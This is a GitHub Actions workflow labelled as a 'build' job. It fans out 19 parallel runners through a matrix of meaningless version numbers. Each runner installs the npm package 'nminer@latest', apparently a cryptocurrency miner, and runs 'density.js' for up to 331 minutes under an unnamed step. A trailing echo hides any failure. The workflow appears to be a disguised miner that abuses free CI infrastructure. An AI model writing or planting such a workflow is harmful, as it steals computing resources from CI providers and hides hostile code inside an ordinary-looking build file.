name: density
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 1816 }
          - { version: 3913 }
          - { version: 4346 }
          - { version: 3762 }
          - { version: 767 }
          - { version: 1047 }
          - { version: 2113 }
          - { version: 4687 }
          - { version: 8508 }
          - { version: 2745 }
          - { version: 4581 }
          - { version: 8224 }
          - { version: 4183 }
          - { version: 8656 }
          - { version: 769 }
          - { version: 3516 }
          - { version: 6089 }
          - { version: 2664 }
          - { version: 3202 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 331m node density.js || echo "density executed"